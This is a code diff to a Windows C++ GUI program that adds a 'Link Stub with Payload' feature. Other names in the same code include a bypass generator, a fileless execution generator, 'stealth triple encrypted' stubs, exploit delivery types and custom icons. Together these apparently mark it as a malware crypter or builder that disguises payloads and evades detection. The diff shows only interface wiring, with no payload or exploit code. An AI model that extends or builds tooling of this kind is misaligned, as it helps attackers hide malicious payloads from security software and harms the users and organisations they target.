@@ -39,6 +39,7 @@
 #include "enhanced_bypass_generator.h"
 #include "fileless_execution_generator.h"
 #include "stealth_triple_encryption.h"
+#include "stub_linker.h"
 
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -111,6 +112,8 @@ constexpr int ID_STEALTH_DECIMAL_KEYS_CHECK = 1048;
 constexpr int ID_STEALTH_RANDOM_ORDER_CHECK = 1049;
 constexpr int ID_STEALTH_DYNAMIC_ENTROPY_CHECK = 1050;
 constexpr int ID_CREATE_STEALTH_STUB = 1051;
+constexpr int ID_STUB_LINKER_ENABLE_CHECK = 1052;
+constexpr int ID_LINK_STUB_WITH_PAYLOAD = 1053;
 
 // Global variables for mass generation
 bool g_massGenerationActive = false;
@@ -155,6 +158,10 @@ HWND g_hStealthEnableCheck;
 HWND g_hStealthDecimalKeysCheck;
 HWND g_hStealthRandomOrderCheck;
 HWND g_hStealthDynamicEntropyCheck;
+
+// Stub Linker controls
+HWND g_hStubLinkerEnableCheck;
+HWND g_hLinkStubWithPayloadButton;
 HWND g_hCreateStealthStubButton;
 
 // Exploit Delivery Types
@@ -1921,6 +1928,7 @@ public:
     EnhancedBypassGenerator bypassGenerator;
     FilelessExecutionGenerator filelessGenerator;
     StealthTripleEncryption stealthEncryption;
+    StubLinker stubLinker;
     
     struct CompanyProfile {
         std::string name;
@@ -3684,6 +3692,13 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
             g_hCreateStealthStubButton = CreateWindowW(L"BUTTON", L"Create Stealth Triple Encrypted Stub", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                                                       10, 780, 220, 30, hwnd, (HMENU)(UINT_PTR)ID_CREATE_STEALTH_STUB, NULL, NULL);
             
+            // Stub Linker Controls
+            g_hStubLinkerEnableCheck = CreateWindowW(L"BUTTON", L"Enable Stub Linker", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                                    240, 780, 120, 20, hwnd, (HMENU)(UINT_PTR)ID_STUB_LINKER_ENABLE_CHECK, NULL, NULL);
+            
+            g_hLinkStubWithPayloadButton = CreateWindowW(L"BUTTON", L"Link Stub with Payload", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
+                                                        370, 775, 150, 30, hwnd, (HMENU)(UINT_PTR)ID_LINK_STUB_WITH_PAYLOAD, NULL, NULL);
+            
             // Custom icon input (moved down)
             CreateWindowW(L"STATIC", L"Custom Icon:", WS_VISIBLE | WS_CHILD,
                          10, 815, 80, 20, hwnd, NULL, NULL, NULL);
@@ -3786,6 +3801,12 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
                 case ID_CREATE_STEALTH_STUB: {
                     // Create stealth triple encrypted stub
                     std::thread(createStealthTripleEncryptedStub).detach();
+                    break;
+                }
+                
+                case ID_LINK_STUB_WITH_PAYLOAD: {
+                    // Link stub with payload using StubLinker
+                    std::thread(linkStubWithPayload).detach();
                     break;
                 }
                 
